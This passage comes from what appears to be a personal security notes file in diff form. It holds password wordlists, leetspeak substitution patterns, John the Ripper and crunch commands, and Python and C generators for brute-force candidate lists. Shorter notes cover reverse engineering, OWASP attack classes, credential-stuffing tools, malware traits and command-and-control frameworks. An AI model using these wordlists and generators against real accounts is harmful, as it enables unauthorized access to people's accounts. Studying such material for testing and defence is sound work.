+-   zero + 1 digital: 01,02,03,04
+-   special numbers - 50,100,1000,300,30,18,7
+-   english: ',
+
+
+<a id="org598b5ac"></a>
+
+## simple obfuscation or Replacement Password Pattern
+
+-   a - @
+-   o - 0
+-   i/l - 1/|
+-   s - 5/$
+-   b/g - 6
+-   g - 9
+
+
+<a id="org6ce5cb9"></a>
+
+## words
+
+cat words | grep -v "<sup>\*</sup>" | cut -f 2- -d ' ' | sed 's/, /\n/g'
+
+
+<a id="org9531ff3"></a>
+
+### rus:
+
+-   russia
+-   belgorod
+-   stalker
+-   spartak
+-   avtoplus
+-   knopka
+-   sobaka
+-   privet
+-   matrix
+-   nirvana
+-   eminem
+-   zvezda
+-   kolobok
+-   flatron
+-   ronaldo
+-   ivanov
+-   windows
+-   viktoria
+-   kotenok
+-   scorpion
+-   romashka
+-   mamapapa
+-   mama
+-   moloko
+-   vladislav
+-   svetik
+-   arsenal
+-   solnce
+-   cjkywt
+-   cjkysirj
+-   lokomotiv
+-   kaktus
+-   kakashka
+-   barsik
+-   pupsik
+-   barcelona
+-   nokia
+-   sandra
+-   slipknot
+-   agent007
+-   pantera
+-   mazafaka
+-   zvezda
+-   abrakadabra
+-   svoboda
+-   kazantip
+-   krasotka
+-   chelsea
+-   cocacola
+-   nikitos
+-   ivanova
+-   fackinshet
+-   antonio
+-   azamat
+-   пароль, gfhjkm
+-   karolina
+-   telefon
+-   avatar
+-   maestro
+-   linkinpark
+-   PolniyPizdec
+-   mamamama
+-   koroleva
+-   mamochka
+-   creative
+-   infiniti
+-   vfvfvfvf
+-   superstar
+-   blablabla
+-   piramida
+-   mandarin
+-   armagedon
+-   manchester
+-   dagestan
+-   solnishko
+-   papamama
+-   dtxyjcnm
+-   juventus
+-   adrenalin
+-   gladiator
+-   karamelka
+-   koshechka
+-   kukuruza
+-   alina
+-   klubnika
+-   babushka
+-   dedushka
+-   belochka
+-   strekoza
+-   arhangel
+-   marmelad
+-   avangard
+-   sukasuka
+
+
+<a id="orgbaa6cec"></a>
+
+### rus names
+
+-   sergey
+-   andrey
+-   natasha
+-   nastya
+-   maksim
+-   svetlana
+-   kirill
+-   aleksandr
+-   kristina
+-   polina
+-   serega
+-   ruslan
+-   oksana
+-   natali
+-   vladimir
+-   karina
+-   viktor
+-   galina
+-   veronika
+-   andrei
+-   valera
+-   ekaterina
+-   valentina
+-   valentin
+-   elena
+-   lenochka
+-   sasha
+-   katerina
+-   larisa
+-   sergei
+-   olga
+-   alexander
+-   alex
+-   anastasia
+-   angelina
+-   irina
+-   vladik
+-   tatyana
+-   dima
+-   aleksey
+-   deniska
+-   vitalik
+-   bogdan
+-   danila
+-   dmitriy
+-   tamara
+-   alexandr
+-   daniil
+-   margarita
+-   victoria
+-   viktoriya
+-   victor
+-   anastasiya
+-   natalia
+-   nikolay
+-   slavik
+-   valeria
+-   oleg
+-   alinka
+-   alina
+-   maksimka
+-   aleksandra
+-   alenka
+-   kostya
+-   artemka
+-   artem
+-   rustam
+-   kostik
+-   evgeny
+-   evgeniy
+-   evgesha
+-   hanihani
+-   ljxtymrf
+-   rhjrjlbk
+-   timoxa
+-   ghjcnjnfr
+-   yjdsqgfhjkm
+-   milashka
+-   amadeus
+-   vasilisa
+-   konstantin
+-   valentin
+-   stanislav
+-   marishka
+-   margosha
+-   marianna
+-   valeriya
+-   nadezhda
+-   dimochka
+-   mashenka
+-   alino4ka
+-   yanochka
+-   OLOLO
+
+
+<a id="org13fb68d"></a>
+
+### universal:
+
+-   wifi
+-   naruto
+-   qwerty
+-   superman
+-   love
+-   loveme
+-   iloveyou
+-   ilovesex
+-   loveyou
+-   fuck
+-   fuckyou
+-   fuckoff
+-   fuckme
+-   test
+-   computer
+-   password
+-   pass
+-   internet
+-   pokemon
+-   starwars
+-   welcome
+-   lol
+-   nikita
+-   andrew
+-   jordan
+-   forever
+-   xxx
+-   qawsed
+-   football
+-   daniel
+-   michael
+-   princess
+-   liverpool
+-   robert
+-   baseball
+-   159753
+-   123321
+-   ukraine
+-   putin
+-   terminator
+-   diablo
+-   satana
+-   philips
+-   predator
+-   metallica
+-   mustang
+-   2000
+-   admin
+-   killer
+-   sexsex
+-   angel
+-   lovelove
+-   rammstein
+-   ramstein
+-   skorpion
+-   beautiful
+-   darkness
+-   remember
+-   navigator
+-   testtest
+-   futurama
+-   november
+-   september
+-   P@ssw0rd
+-   greenday
+-   fuckfuck
+-   panda
+-   godsave
+-   truelove
+-   tryagain
+-   sushi
+-   master
+
+
+<a id="org52725c6"></a>
+
+### games:
+
+-   warcraft
+-   warhammer
+-   warhamer
+-   fortnite
+-   doom
+-   startcraft
+-   minecraft
+-   tetris
+-   lineage
+-   wow
+-   fifa
+-   harrypotter
+-   harry
+-   potter
+-   Hogwarts
+-   voldemort
+-   frodo
+-   gandalf
+-   morrowind
+-   batman
+-   joker
+-   oblivion
+-   needforspeed
+
+
+<a id="org036e37b"></a>
+
+### companies
+
+-   adidas
+-   vkontakte, vkontakt, kontakt
+-   rambler
+-   ferrari
+-   motorola
+-   winston
+-   toyota
+-   mersedes
+-   panasonic
+-   nissan
+-   samsung
+-   google
+-   logitech
+-   genius
+-   lenovo
+-   sony
+-   siemens
+-   apple
+-   aliexpress
+-   ozon
+-   rambler
+-   yandex
+-   tiktok
+-   instagram
+-   telegram
+-   whatsapp
+-   WeChat
+-   weixin
+-   SnapChat
+-   viber
+
+
+<a id="org44f9938"></a>
+
+### eng:
+
+-   hunter
+-   status
+-   sunshine
+-   hello
+-   love
+-   freedom
+-   secret
+-   shadow
+-   myspace
+-   monkey
+-   chocolate
+-   mynoob
+-   lovely
+-   target
+-   letmein
+-   pussy
+-   jennifer
+-   buster
+-   soccer
+-   harley
+-   tigger
+-   charlie
+-   thomas
+-   hockey
+-   ranger
+-   klaster
+-   george
+-   asshole
+-   michelle
+-   jessica
+-   pepper
+-   maggie
+-   ginger
+-   joshua
+-   cheese
+-   amanda
+-   summer
+-   ashley
+-   nicole
+-   biteme
+-   matthew
+-   yankees
+-   dallas
+-   austin
+-   thunder
+-   taylor
+-   trustno1
+-   access
+-   hammer
+-   silver
+-   patrick
+-   scooter
+-   orange
+-   cowboy
+-   money
+
+
+<a id="orgdbb9538"></a>
+
+## stats
+
+%
+
+-   only lower - 41,67
+-   mixed letters and numeric - 37
+-   only numeric - 15
+-   contains special charactes - 3.8
+-   only upper cases - 1.62
+
+characters % (without ")
+
+-   . - 0.7
+-   \_ - 0.58
+-   ! - 0.55
+-   - - 0.39
+-   @ - 0.32
+-   \* - 0.3
+-   \# - 0.18
+-   / - 0.12
+-   $ - 0.1
+-   , - 0.09
+-   & - 0.088
+-   ? - 0.08
+-   + - 0.073
+-   = - 0.057
+-   ) - 0.056
+-   ( - 0.055
+-   ' - 0.05
+-   ; - 0.044
+
+
+<a id="orgc46644e"></a>
+
+## generate wordlist
+
+-   hashcat
+-   John the Ripper
+-   PasswordsPro:
+-   Rsmangler
+-   crunch
+
+
+<a id="orgd09ce2e"></a>
+
+### John the Ripper
+
+-   <https://www.openwall.com/john/doc/OPTIONS.shtml>
+-   <https://www.openwall.com/john/doc/RULES.shtml>
+-   /etc/john/john.conf or .john/john.conf
+    -   section: [List.Rules:Wordlist]
+-   john &#x2013;wordlist=air-test/password.lst &#x2013;rules &#x2013;stdout
+
+
+<a id="org6cad89f"></a>
+
+### app-crypt/johntheripper-jumbo
+
+-   john &#x2013;wordlist=air-test/password.lst &#x2013;rules:Single &#x2013;min-length=8 &#x2013;max-length=10 &#x2013;stdout
+
+
+<a id="org5c08348"></a>
+
+### hashcat
+
+-   <https://hashcat.net/wiki/doku.php?id=rule_based_attack>
+
+
+<a id="org3ef8f65"></a>
+
+### app-misc/crunch
+
+-   <https://xeushack.github.io/wordlists-with-crunch>
+-   <https://www.hackingarticles.in/a-detailed-guide-on-crunch/>
+-   <https://www.linuxsecrets.com/1669-creating-wordlists-for-penetration-testing-with-crunch>
+-   crunch [minimum length] [maximum length] [charset / extra options]
+-   -o outputfile
+-
+
+
+<a id="org86cf025"></a>
+
+## my sequence
+
+-   john rules on name
+-   one word: all sequences and worlds capitalized and filtered
+-   most common
+-   dates
+-   two words
+-   john rules on "one word"
+
+old
+
+-   key sequence (sequences.txt) + dates
+-   reverse sequences (sequences<sub>rev.txt</sub>)
+-   sequence words (wordlist<sub>ks</sub>) + default passwords
+-   sequence words (wordlist<sub>ks</sub>) + default passwords  (upper lower)
+-   reverse sequence words (wordlist<sub>ks</sub>)
+-   reverse sequence words (wordlist<sub>ks</sub>) (upper lower)
+-   filtered sequence words result (wordlist<sub>ks8</sub>)
+-   all numbers = 8 (alldigits8.txt)
+-   all numbers = 10 (alldigits10.txt)
+-   all numbers+A-F - upper, lower, 8, 10, 9
+-   >8 normal =n.txt
+-   >8 all lowercase =l.txt
+-   >8 all uppercase =u.txt
+-   >8 capitalized
+-   <5 double normal
+-   <5 double all lowercase
+-   <5 double all upper
+-   <5 double first upper second lower
+-   <5 double first lowwer second upper
+
+
+<a id="orgaba10a4"></a>
+
+## bash for passwords
+
+sort by symbols
+
+-   cat old-driver-passwords | nl -b a -s : | sort -t : -k 2 -u | cut -d : -f 2- > old-driver-passwords
+
+filter lines 2-8 chars
+
+-   grep -E '^.{2,8}$' &#x2013;color=never infile
+-   sed -nr '/^.{2,8}$/p' infile
+-   cat TOP<sub>VK</sub>-100M<sub>WPA.txt</sub> | grep -o -E '[a-zA-Z]{4,}' | uniq
+
+reverse characters: rev
+
+shuffle and random line: shuf
+
+
+<a id="orgc25e737"></a>
+
+## bash generate password
+
+-   < /dev/urandom tr -dc \_A-Z-a-z-0-9 | head -c 32 ;echo;
+-   tr -cd '[:alnum:]' < /dev/urandom | fold -w30 | head -n1
+
+    strings /dev/urandom | grep -o '[[:alnum:]]' | head -n 30 | tr -d '\n'; echo
+
+-   < /dev/urandom tr -dc \_A-Z-a-z-0-9 | fold -w8
+-   dd if=/dev/urandom bs=1 count=32 2>/dev/null | base64 -w 0 | rev | cut -b 2- | rev
+-   openssl rand -base64 32
+-   date | md5sum
+-   date +%s | sha256sum | base64 | head -c 32 ; echo
+
+tmpfs
+
+-   mount -t tmpfs -o size=10m tmpfs /tmp/a
+
+
+<a id="org83cb2bf"></a>
+
+## my
+
+    import itertools as it
+    from datetime import datetime
+
+    ALPHA_LOW = "abcdefghijklmopqrstuvwxyz"
+    ALPHA_UP = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    ALPHA = ALPHA_LOW + ALPHA_UP
+    NUMBERS = "0123456789"
+    # special = " `èéà@ç-/\\:#{}[]()'&*`^$!."
+    ADDITIONAL_SPECIAL = ['.', '_', '!', '-', '@', '*', '#', '/', '$']
+    ADDITIONAL_SPECIAL_DOUPLES = ['..', '__','!!']
+    ADDITIONAL = ['1', '11', '12', '13', '123', 'a', 'q', 'qq', 'aa', '0', '00', '01', '2', '3', '7'] \
+            + ADDITIONAL_SPECIAL + ADDITIONAL_SPECIAL_DOUPLES
+
+    ADDITIONAL_1CHAR = [x for x in ADDITIONAL if len(x) == 1]
+
+    # WFUNC = lambda x: print(x)
+    # f = open("sequences.txt", "w")
+    f = open("alldigits8.txt", "w")
+    WFUNC = lambda x: f.write(x + '\n')
+
+    def wp(l):
+    	l = list(l)
+    	# print(type(l), l)
+    	if isinstance(l[0], str):
+    		WFUNC("".join(l))
+    	else:
+    		#if not isinstance(l[0], list) and not isinstance(l[0], tuple):
+    		#	l = [list(v) for v in l]
+    		for v in l:
+    			v = list(v)
+    			# print(type(v), v)
+    			if isinstance(v[0], str):
+    				WFUNC("".join(v))
+    			else:
+    				for vv in v:
+    					WFUNC("".join(vv))
+
+
+    def wget(l):
+    	l = list(l)
+    	# print(type(l), l)
+    	if isinstance(l[0], list) or isinstance(l[0], tuple):
+    		return ["".join(v) for v in l]
+    	else:
+    		return "".join(l)
+
+
+    def frep(f, items, reps:list):
+            if isinstance(reps, range):
+                    reps = list(reps)
+                    r = []
+            for v in reps:
+                    r.append(f(items, v))
+            return r
+
+
+    def frep_prod(f, items, reps:list):
+            if isinstance(reps, range):
+                    reps = list(reps)
+                    r = []
+            for v in reps:
+                    a = f(items, repeat=v)
+                    a = list(a)
+                    print(a)
+                    r.append(a)
+            return r
+
+
+    # -------------- Key Sequences
+    def key_sequences():
+        # REP8 4-10: alphabet = aaaaaaaa, bbbbbbbb, 11111111
+        for v in list(ALPHA_LOW) + list(NUMBERS) + ADDITIONAL_SPECIAL:
+            wp(frep(it.repeat, v, range(3,10) ))
+        # REP2 2,3,4,5: 1 2 3 4 5 6 7 8 9 = 12121212, 32323232
+        a = it.permutations(NUMBERS, 2)
+        for v in wget(a):
+            wp(frep(it.repeat, v, range(2,6) ))
+
+        # PERM 2-3: 123 qwe asd zxc = 123123, 123qwe, qwe123
+        z = ['123', 'qwe', 'asd', 'zxc']
+        a1 = it.product(z, repeat=2)
+        a2 = it.product(z, repeat=3)
+        wp([a1,a2])
+
+        # PERM 2: qwer asdf zxcv 1234
+        a = it.product(['1234', 'qwer', 'asdf', 'zxcv'], repeat=2)
+        wp(a)
+
+        # REP2,3: qaz wsx, rfv, 123
+        z = ['qaz', 'wsx', 'rfv', '123']
+        a1 = it.product(z, repeat=2)
+        a2 = it.product(z, repeat=3)
+        wp([a1,a2])
+        # PERM2: 1qaz 2wsx, 3rfv
+        a = it.product(["1qaz", "2wsx", "3rfv"], repeat=2)
+        wp(a)
+        # PERM4: 12, qw, as, zx
+        a = it.product(["12", "qw", "as", "zx"], repeat=4)
+        wp(a)
+
+
+    def dates():
+        # year, month, dates
+        y_start=1930
+        m_start=1
+        d_start=1
+        y_now = datetime.now().year
+        special = ADDITIONAL_SPECIAL + ADDITIONAL_SPECIAL_DOUPLES
+        for y in range(y_start, y_now+1):
+            for m in range(m_start, 12+1):
+                for d in range(m_start, 31+1):
+                    # -- simple digits
+                    # WFUNC(f"{y}{m}{d}")
+                    # WFUNC(f"{d}{m}{y}")
+                    # -- with 0
+                    WFUNC(f"{y}{m:02d}{d:02d}")
+                    WFUNC(f"{d:02d}{m:02d}{y}")
+                    # -- with 0 with special
+                    for s in special:
+                        WFUNC(f"{y}{s}{m:02d}{s}{d:02d}")
+                        WFUNC(f"{d:02d}{s}{m:02d}{s}{y}")
+                    # -- without 0 with special
+                    for s in special:
+                        WFUNC(f"{y}{s}{m}{s}{d}")
+                        WFUNC(f"{d}{s}{m}{s}{y}")
+
+                    # -- with 0 with special without 19,20
+                    for s in special:
+                        WFUNC(f"{str(y)[-2:]}{s}{m:02d}{s}{d:02d}")
+                        WFUNC(f"{d:02d}{s}{m:02d}{s}{str(y)[-2:]}")
+                    # -- without 0 with special without 19,20
+                    for s in special:
+                        WFUNC(f"{str(y)[-2:]}{s}{m}{s}{d}")
+                        WFUNC(f"{d}{s}{m}{s}{str(y)[-2:]}")
+
+        # year now
+        WFUNC(str(y_now) + str(y_now))
+        for v in special:
+            WFUNC(str(y_now) + v +  str(y_now))
+
+
+    def all_numbers8():
+        # PERMUtatiosn all digits
+        # z = frep_prod(it.product, NUMBERS, range(1,4))
+        # wp(z)
+        a1 = it.product(NUMBERS, repeat=4)
+        a1 = list(a1)
+        for v1 in a1:
+            for v2 in a1:
+                p = "".join(v1) + "".join(v2)
+                WFUNC(p)
+
+
+    def all_numbers10():
+        a1 = it.product(NUMBERS, repeat=4)
+        a1 = list(a1)
+        for v1 in a1:
+            a2 = it.product(NUMBERS, repeat=6)
+            for v2 in a2:
+                p = "".join(v1) + "".join(v2)
+                WFUNC(p)
+
+
+    if __name__ == "__main__":
+        # key_sequences()
+        # dates()
+        # all_numbers8()
+        all_numbers10()
+
+
+<a id="org58c1c05"></a>
+
+## bases
+
+-   vk <https://github.com/tokyoneon/1wordlist/>
+    -   <https://null-byte.wonderhowto.com/how-to/use-leaked-password-databases-create-brute-force-wordlists-0184006/>
+
+
+<a id="orgecd090f"></a>
+
+## fast permutation
+
+-   C++ <https://www.quickperm.org/01example.php>
+
+
+    // NOTICE:  Copyright 2008, Phillip Paul Fuchs
+
+    #define N    12   // number of elements to permute.  Let N > 2
+
+
+    // NOTICE:  Copyright 2008, Phillip Paul Fuchs
+
+    void display(unsigned int *a, unsigned int j, unsigned int i) {
+       for(unsigned int x = 0; x < N; x++)
+          printf("%d ",a[x]);
+       printf("   swapped(%d, %d)\n", j, i);
+       //getch();  // Remove comment for "Press any key to continue" prompt.
+    } // display()
+
+
+    void QuickPerm(void) {
+       unsigned int a[N], p[N];
+       register unsigned int i, j, tmp; // Upper Index i; Lower Index j
+
+       for(i = 0; i < N; i++) {  // initialize arrays; a[N] can be any type
+          a[i] = i + 1;   // a[i] value is not revealed and can be arbitrary
+          p[i] = 0;       // p[i] == i controls iteration and index boundaries for i
+       }
+       //display(a, 0, 0);   // remove comment to display array a[]
+       i = 1;   // setup first swap points to be 1 and 0 respectively (i & j)
+       while(i < N) {
+          if (p[i] < i) {
+             j = i % 2 * p[i];   // IF i is odd then j = p[i] otherwise j = 0
+             tmp = a[j];         // swap(a[j], a[i])
+             a[j] = a[i];
+             a[i] = tmp;
+             display(a, j, i); // remove comment to display target array a[]
+             p[i]++;             // increase index "weight" for i by one
+             i = 1;              // reset index i to 1 (assumed)
+          } else {               // otherwise p[i] == i
+             p[i] = 0;           // reset p[i] to zero
+             i++;                // set new index value for i (increase by one)
+          } // if (p[i] < i)
+       } // while(i < N)
+    } // QuickPerm()
+
+
+
+
+    int main(){
+      QuickPerm()
+    }
+
+
+<a id="orgfcb7901"></a>
+
+## brutefoce in c
+
+-   <https://github.com/Jsdemonsim/Stackoverflow/tree/master/alphabet>
+
+    // Print all combinations of the given alphabet up to length n.
+    //
+    // Example: length 3 combinations are:
+    //
+    // aaa
+    // aab
+    // aac
+    // ...
+    // aa9
+    // aba
+    // abb
+    // abc
+    // ...
+    // a99
+    // baa
+    // bab
+    // ...
+    // 998
+    // 999
+    //
+    // The best way to test this program is to output to /dev/null, otherwise
+    // the file I/O will dominate the test time.
+    //
+    // This is the same as alphabet.c except this version uses 3 hardcoded
+    // letters instead of 2.
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <unistd.h>
+
+    const char *alphabet = "abcdefghijklmnopqrstuvwxyz"
+    		       "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    		       "0123456789";
+
+    static void generate(int maxlen);
+
+    int main(int argc, char *argv[])
+    {
+        if (argc < 2) {
+    	fprintf(stderr, "Usage: %s Length\n", argv[0]);
+    	exit(1);
+        }
+
+        generate(atoi(argv[1]));
+        return 0;
+    }
+
+    /**
+     * Generates all patterns of the alphabet up to maxlen in length.  This
+     * function uses a buffer that holds alphaLen^3 patterns at a time.
+     * One pattern of length 5 would be "aaaaa\n".  The reason that alphaLen^3
+     * patterns are used is because we prepopulate the buffer with the last 3
+     * letters already set to all possible combinations.  So for example,
+     * the buffer initially looks like "aaaaa\naaaab\naaaac\n ... aa999\n".  Then
+     * on every iteration, we write() the buffer out, and then increment the
+     * fourth to last letter.  So on the first iteration, the buffer is modified
+     * to look like "abaaa\nabaab\nabaac\n ... ab999\n".  This continues until
+     * all combinations of letters are exhausted.
+     */
+    static void generate(int maxlen)
+    {
+        int   alphaLen = strlen(alphabet);
+        int   len      = 0;
+        char *buffer   = malloc((maxlen + 1) * alphaLen * alphaLen * alphaLen);
+        int  *letters  = malloc(maxlen * sizeof(int));
+
+        if (buffer == NULL || letters == NULL) {
+    	fprintf(stderr, "Not enough memory.\n");
+    	exit(1);
+        }
+
+        // This for loop generates all 1 letter patterns, then 2 letters, etc,
+        // up to the given maxlen.
+        for (len=1;len<=maxlen;len++) {
+    	// The stride is one larger than len because each line has a '\n'.
+    	int i;
+    	int stride = len+1;
+    	int bufLen = stride * alphaLen * alphaLen * alphaLen;
+
+    	if (len == 1) {
+    	    // Special case.  The main algorithm hardcodes the last two
+    	    // letters, so this case needs to be handled separately.
+    	    int j = 0;
+    	    bufLen = (len + 1) * alphaLen;
+    	    for (i=0;i<alphaLen;i++) {
+    		buffer[j++] = alphabet[i];
+    		buffer[j++] = '\n';
+    	    }
+    	    write(STDOUT_FILENO, buffer, bufLen);
+    	    continue;
+    	} else if (len == 2) {
+    	    // Also a special case.
+    	    int let0 = 0;
+    	    int let1 = 0;
+    	    bufLen = (len + 1) * alphaLen * alphaLen;
+    	    for (i=0;i<bufLen;i+=stride) {
+    		buffer[i]   = alphabet[let0];
+    		buffer[i+1] = alphabet[let1++];
+    		buffer[i+2] = '\n';
+    		if (let1 == alphaLen) {
+    		    let1 = 0;
+    		    let0++;
+    		    if (let0 == alphaLen)
+    			let0 = 0;
+    		}
+    	    }
+    	    write(STDOUT_FILENO, buffer, bufLen);
+    	    continue;
+    	}
+
+    	// Initialize buffer to contain all first letters.
+    	memset(buffer, alphabet[0], bufLen);
+
+    	// Now write all the last 3 letters and newlines, which
+    	// will after this not change during the main algorithm.
+    	{
+    	    // Let0 is the 3rd to last letter.  Let1 is the 2nd to last letter.
+    	    // Let2 is the last letter.
+    	    int let0 = 0;
+    	    int let1 = 0;
+    	    int let2 = 0;
+    	    for (i=len-3;i<bufLen;i+=stride) {
+    		buffer[i]   = alphabet[let0];
+    		buffer[i+1] = alphabet[let1];
+    		buffer[i+2] = alphabet[let2++];
+    		buffer[i+3] = '\n';
+    		if (let2 == alphaLen) {
+    		    let2 = 0;
+    		    let1++;
+    		    if (let1 == alphaLen) {
+    			let1 = 0;
+    			let0++;
+    			if (let0 == alphaLen)
+    			    let0 = 0;
+    		    }
+    		}
+    	    }
+    	}
+
+    	// Write the first sequence out.
+    	write(STDOUT_FILENO, buffer, bufLen);
+
+    	// Special case for length 3, we're already done.
+    	if (len == 3)
+    	    continue;
+
+    	// Set all the letters to 0.
+    	for (i=0;i<len;i++)
+    	    letters[i] = 0;
+
+    	// Now on each iteration, increment the the fourth to last letter.
+    	i = len-4;
+    	do {
+    	    char c;
+    	    int  j;
+
+    	    // Increment this letter.
+    	    letters[i]++;
+
+    	    // Handle wraparound.
+    	    if (letters[i] >= alphaLen)
+    		letters[i] = 0;
+
+    	    // Set this letter in the proper places in the buffer.
+    	    c = alphabet[letters[i]];
+    	    for (j=i;j<bufLen;j+=stride)
+    		buffer[j] = c;
+
+    	    if (letters[i] != 0) {
+    		// No wraparound, so we finally finished incrementing.
+    		// Write out this set.  Reset i back to second to last letter.
+    		write(STDOUT_FILENO, buffer, bufLen);
+    		i = len - 4;
+    		continue;
+    	    }
+
+    	    // The letter wrapped around ("carried").  Set up to increment
+    	    // the next letter on the left.
+    	    i--;
+    	    // If we carried past last letter, we're done with this
+    	    // whole length.
+    	    if (i < 0)
+    		break;
+    	} while(1);
+        }
+
+        // Clean up.
+        free(letters);
+        free(buffer);
+    }
+
+
+<a id="org7534fa8"></a>
+
+# reverse engeering
+
+-   $strings file
+-   first libraries
+-   last portion of the list contains names of sections of the file
+
+
+<a id="org2439deb"></a>
+
+## links
+
+<https://www.codementor.io/@packt/reverse-engineering-a-linux-executable-hello-world-rjceryk5d>
+
+
+<a id="org93e0834"></a>
+
+## objdump
+
+objdump -d hello > disassembly.asm
+
+-   AT&T disassembly syntax
+
+objdump -M intel -d hello > disassembly.asm
+
+
+<a id="orgaffebf6"></a>
+
+## TODO file
+
+
+<a id="org6c0fa89"></a>
+
+## Dynamic analysis
+
+should be done in a sandbox environment
+
+-   trace
+    -   hows a readable code of what the program did
+    -   logged library functions that the program called and received
+-   strace
+    -   logs system calls
+        -   execve runs a program pointed to by the filename
+        -   open and read are system calls that are used here to read files
+        -   mmap2, mprotect, and brk are responsible for memory activities such as allocation,
+            permissions, and segment boundary setting
+
+
+<a id="org5668e5f"></a>
+
+### gdb
+
+<https://www.youtube.com/watch?v=PorfLSr3DDI>
+default AT&T sytnax
+
+commands:
+
+-   disass command - disassembly of specified functions
+-   set disassembly-flavor intel - Intel syntax
+
+
+<a id="org2509831"></a>
+
+## Assembler
+
+<https://en.wikipedia.org/wiki/X86_assembly_language>
+
+consists of a series of
+
+-   mnemonic processor instructions - consist of an **opcode mnemonic** followed by an **operand**, which
+    might be a list of data, arguments or parameters
+-   meta-statements (known variously as
+    -   declarative operations
+    -   directives
+    -   pseudo-instructions
+    -   pseudo-operations
+    -   pseudo-ops
+-   comments
+-   data
+
+Parity bit - error detecting code
+
+data sizes −
+
+-   Word: a 2-byte data item
+-   Doubleword: a 4-byte (32 bit) data item
+-   Quadword: an 8-byte (64 bit) data item
+-   Paragraph: a 16-byte (128 bit) area
+-   Kilobyte: 1024 bytes
+-   Megabyte: 1,048,576 bytes
+
+fetch-decode-execute cycle or the execution cycle:
+
+-   The processor may access one or more bytes of memory at a time
+-   The processor stores data in reverse-byte sequence
+-   steps:
+    -   Fetching the instruction from memory
+    -   Decoding or identifying the instruction
+    -   Executing the instruction
+
+two kinds of memory addresses
+
+-   Absolute address - a direct reference of specific location.
+-   Segment address (or offset) - starting address of a memory segment with the offset value.
+
+
+<a id="org4e4ba36"></a>
+
+## syntaxes
+
+-   Intel syntax - x86 assembly language - dominant in the DOS and Windows world
+-   AT&T syntax is dominant in the Unix world
+
+
+<a id="org90a21d6"></a>
+
+# attacks theory
+
+-   Credential stuffing - collects stolen account credentials, email addresses and the corresponding passwords (often from
+    a data breach), and then uses the credentials to gain unauthorized access to user accounts on other systems through
+    large-scale automated login
+    -   Selenium, cURL, PhantomJS or tools designed specifically for these types of attacks, such as Sentry MBA, SNIPR,
+        STORM, Blackbullet and Openbullet
+-   web cache poisoning <https://portswigger.net/research/practical-web-cache-poisoning>
+
+
+<a id="org7032e1e"></a>
+
+## base attacks
+
+-   **Replay attack** network attack in which a valid data transmission is repeated or delayed
+    -   possibly as part of a spoofing attack by IP packet substitution
+    -   prevented with session id/token
+-   **spoofing** attack
+-   **Denial-of-service** attack (DoS)
+-   **Man-in-the-middle** attack - alters the communications
+
+
+<a id="orga8c7903"></a>
+
+## server-side attacks
+
+TODO expliot
+
+
+<a id="org0e2839c"></a>
+
+## client-side attacks
+
+
+<a id="orgdb805b1"></a>
+
+### injection attack
+
+supplies untrusted input to a program
+
+1.  TODO SQLi
+
+2.  Cross Site Scripting (XSS)
+
+    -   inject code on page
+        -   without proper validation or escaping
+        -   updates an existing web page with user-supplied data using a browser API that can create HTML or
+            JavaScript.
+    -   call by user
+
+3.  TODO OSCI
+
+
+<a id="org90df0a6"></a>
+
+## OWASP top 10
+
+-   injection
+
+
+<a id="org899aabe"></a>
+
+### TODO Broken Authentication and Session Management
+
+
+<a id="org521181b"></a>
+
+### Sensitive Data Exposure
+
+data may be compromised without extra protection, such as encryption at rest or in transit, and
+requires special precautions when exchanged with the browser.
+
+
+<a id="orgdefcdf9"></a>
+
+### XML External Entities (XXE).
+
+-   older or poorly configured XML processors evaluate external entity references within XML
+    documents.
+-   External entities can be used to disclose internal files using the file URI handler,
+
+internal file shares, internal port scanning, remote code execution, and denial of service attacks.
+
+
+<a id="org35e75fc"></a>
+
+### Broken Access Control.
+
+-   Restrictions on what authenticated users are allowed to do are often not properly enforced.
+-   Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access
+
+other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc.
+
+
+<a id="org09653d6"></a>
+
+### Security Misconfiguration
+
+-   default configurations
+-   incomplete or ad hoc configurations
+-   open cloud storage
+-   misconfigured HTTP headers
+-   verbose error messages containing sensitive information
+
+
+<a id="org6000388"></a>
+
+### Insecure Deserialization
+
+allow replay attacks, injection attacks, and privilege escalation attacks.
+
+
+<a id="org62e093e"></a>
+
+### Using Components with Known Vulnerabilities
+
+libraries, frameworks, and other software modules, run with the same privileges as the application
+
+
+<a id="org86294eb"></a>
+
+### Insufficient Logging & Monitoring
+
+
+<a id="orga32db88"></a>
+
+## links
+
+-   all attacks <https://portswigger.net/kb/issues>
+
+
+<a id="org9ef7c3f"></a>
+
+# virus
+
+32- and 64-bit versions
+
+-   run a few tests and see what kind of capabilities its current user has
+-   reporting the results to a C&C server.
+-   can receive new modules
+-   has a small size
+
+
+<a id="orgb43d6d3"></a>
+
+# virus spreading
+
+-   Spear phishing
+-   attacker brute-forcing services with exposed ports
+
+
+<a id="orgde9c6a3"></a>
+
+# NN code scaner
+
+-   2018 <https://arxiv.org/pdf/1807.04320.pdf>
+-   PHP NN scan 2020 <https://arxiv.org/pdf/2012.08835.pdf>
+
+
+<a id="orgc795fdb"></a>
+
+# penetration / infiltrate system
+
+penetration tests focus on unpatched vulnerabilities and misconfigurations
+
+
+<a id="org0ead04c"></a>
+
+## penetration testing tool
+
+TOTDO:
+
+-   BackBox
+-   Hping
+-   Metasploit Project - payloads
+-   Nessus - payloads
+-   Nmap
+-   SAINT
+-   w3af - payloads
+-   OpenVAS - payloads <https://github.com/greenbone/openvas-scanner>
+    -   GPL - C
+    -   German web site
+
+
+<a id="org2fad0a4"></a>
+
+### Zed Attack Proxy (ZAP) OWASP project
+
+-   java
+-   gradle builder
+
+
+<a id="org7a2fdde"></a>
+
+### links
+
+-   <https://www.zaproxy.org>
+-   <https://github.com/zaproxy/>
+
+
+<a id="orgdbc6e68"></a>
+
+## linux .desktop file
+
+-   .desktop file
+    -   Exec=[17](#org964fc2a)
+
+
+<a id="org549e652"></a>
+
+## webtesting suite
+
+-   scraping
+-   parsing data
+-   automated pentesting
+-   unit testing through selenium - framework, automating tests for web applications across diversified platforms as well
+    as browsers
+-   Credential stuffing
+
+
+<a id="org262a33a"></a>
+
+# TODO exfiltrate data
+
+
+<a id="orgc3ad2f0"></a>
+
+# Command and Control Center
+
+-   Cobalt Strike
+-   Brute Ratel Command and Control Center (Brute Ratel C4 или BRc4) - годовая лицен­зия на Brute Ratel сто­ит 2500$
+
+
+<a id="org75ef6d5"></a>
+
